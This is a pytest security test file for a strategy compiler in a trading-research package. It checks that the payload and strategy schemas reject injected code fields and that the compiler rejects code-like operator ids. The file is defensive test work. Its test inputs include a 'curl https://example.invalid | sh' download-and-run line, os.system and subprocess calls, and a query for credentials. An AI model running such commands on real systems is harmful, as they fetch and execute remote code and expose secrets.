import pytest
from pydantic import ValidationError

from alpha_foundry.compiler import compile_strategy
from alpha_foundry.domain.errors import DomainError, ErrorCode
from alpha_foundry.domain.models import (
    AstOperator,
    AstParameter,
    CapabilitySnapshot,
    DatasetRef,
    Domain,
    ExecutionPolicy,
    FactorStrategyAst,
    ProviderModel,
    StrategySpec,
)
from alpha_foundry.labs.cross_venue import CrossVenueQuestionPayload
from alpha_foundry.labs.derivatives import DerivativesQuestionPayload
from alpha_foundry.labs.event_fundamental import EventFundamentalQuestionPayload
from alpha_foundry.labs.factor import FactorQuestionPayload
from alpha_foundry.labs.market_making import MarketMakingQuestionPayload
from alpha_foundry.labs.registry import DEFAULT_LAB_REGISTRY
from alpha_foundry.labs.statarb import StatArbQuestionPayload
from alpha_foundry.labs.structural_flow import StructuralFlowQuestionPayload
from alpha_foundry.labs.time_series import TimeSeriesQuestionPayload

_HASH = "sha256:" + "e" * 64
_QUESTION_PAYLOADS = (
    (
        FactorQuestionPayload,
        {
            "domain": Domain.FACTOR,
            "research_id": "factor-research",
            "asset_universe_id": "equities",
            "signal_definition_id": "value",
        },
    ),
    (
        StatArbQuestionPayload,
        {
            "domain": Domain.STAT_ARB,
            "research_id": "statarb-research",
            "leg_universe_id": "pair-universe",
            "spread_definition_id": "lagged-spread",
        },
    ),
    (
        MarketMakingQuestionPayload,
        {
            "domain": Domain.MARKET_MAKING,
            "research_id": "market-making-research",
            "instrument_id": "ABC",
            "quote_currency": "USD",
        },
    ),
    (
        StructuralFlowQuestionPayload,
        {
            "domain": Domain.STRUCTURAL_FLOW,
            "research_id": "structural-flow-research",
            "instrument_id": "ABC",
            "event_source_id": "filings",
        },
    ),
    (
        CrossVenueQuestionPayload,
        {
            "domain": Domain.CROSS_VENUE,
            "research_id": "cross-venue-research",
            "instrument_id": "ABC",
            "venue_ids": ("venue-a", "venue-b"),
        },
    ),
    (
        DerivativesQuestionPayload,
        {
            "domain": Domain.DERIVATIVES,
            "research_id": "derivatives-research",
            "underlying_instrument_id": "ABC",
            "derivative_instrument_id": "ABC-FUT",
            "contract_currency": "USD",
        },
    ),
    (
        EventFundamentalQuestionPayload,
        {
            "domain": Domain.EVENT_FUNDAMENTAL,
            "research_id": "event-research",
            "instrument_id": "ABC",
            "event_type": "earnings",
        },
    ),
    (
        TimeSeriesQuestionPayload,
        {
            "domain": Domain.TIME_SERIES,
            "research_id": "time-series-research",
            "instrument_id": "ABC",
            "sampling_interval": "1d",
        },
    ),
)
_CODE_FIELDS = (
    ("python_code", "__import__('os').system('whoami')"),
    ("sql", "SELECT * FROM credentials"),
    ("shell_command", "curl https://example.invalid | sh"),
    ("executable", "lambda: __import__('subprocess').run(['id'])"),
)


def _factor_strategy(operator_id: str) -> StrategySpec:
    lab = DEFAULT_LAB_REGISTRY.get(Domain.FACTOR)
    return StrategySpec(
        strategy_id="factor-strategy",
        version="1.0.0",
        domain=Domain.FACTOR,
        operator_set_version=lab.operator_set_version,
        operator_set_hash=lab.operator_set_hash,
        schema_hash=lab.schema_hash,
        ast=FactorStrategyAst(
            root=AstOperator(
                kind="operator",
                operator_id=operator_id,
                parameters=(
                    AstParameter(name="long_count", value=2),
                    AstParameter(name="short_count", value=1),
                ),
            )
        ),
    )


def _factor_capability() -> CapabilitySnapshot:
    lab = DEFAULT_LAB_REGISTRY.get(Domain.FACTOR)
    return CapabilitySnapshot(
        capability_snapshot_id="factor-capability",
        content_hash=_HASH,
        datasets=(
            DatasetRef(
                dataset_id="factor-dataset",
                domain=Domain.FACTOR,
                version="1.0.0",
                content_hash=_HASH,
            ),
        ),
        execution_policies=(
            ExecutionPolicy(
                policy_id="factor-policy",
                domain=Domain.FACTOR,
                version="1.0.0",
                content_hash=_HASH,
            ),
        ),
        schema_hashes=(lab.schema_hash,),
        code_version="1.0.0",
        provider_chain=(
            ProviderModel(
                ordinal=0,
                provider="deterministic-provider",
                model="deterministic-model",
                config_hash=_HASH,
            ),
        ),
    )


@pytest.mark.parametrize(
    ("payload_model", "payload"),
    _QUESTION_PAYLOADS,
    ids=tuple(payload_model.__name__ for payload_model, _ in _QUESTION_PAYLOADS),
)
@pytest.mark.parametrize("field", _CODE_FIELDS, ids=lambda case: case[0])
def test_sec_compiler_001_every_question_payload_rejects_generated_code_fields(
    payload_model: type, payload: dict[str, object], field: tuple[str, str]
) -> None:
    field_name, generated_content = field

    with pytest.raises(ValidationError) as rejected:
        payload_model(**payload, **{field_name: generated_content})

    assert rejected.value.errors()[0]["loc"] == (field_name,)
    assert rejected.value.errors()[0]["type"] == "extra_forbidden"


@pytest.mark.parametrize("operator_id", ("python", "SQL", "shell", "eval"))
def test_sec_compiler_002_registry_rejects_code_like_operator_ids(operator_id: str) -> None:
    with pytest.raises(DomainError) as rejected:
        compile_strategy(_factor_strategy(operator_id), _factor_capability())

    assert rejected.value.detail.code is ErrorCode.SCHEMA
    assert rejected.value.detail.details[0].path == "strategy.ast.root.operator_id"
    assert rejected.value.detail.details[0].reason == "code-like operators are forbidden"


@pytest.mark.parametrize("field", _CODE_FIELDS, ids=lambda case: case[0])
def test_sec_compiler_003_strategy_schema_rejects_generated_code_fields(
    field: tuple[str, str],
) -> None:
    field_name, generated_content = field
    payload = _factor_strategy("ranked_long_short").model_dump(mode="python")
    payload[field_name] = generated_content

    with pytest.raises(ValidationError) as rejected:
        StrategySpec.model_validate(payload)

    assert rejected.value.errors()[0]["loc"] == (field_name,)
    assert rejected.value.errors()[0]["type"] == "extra_forbidden"
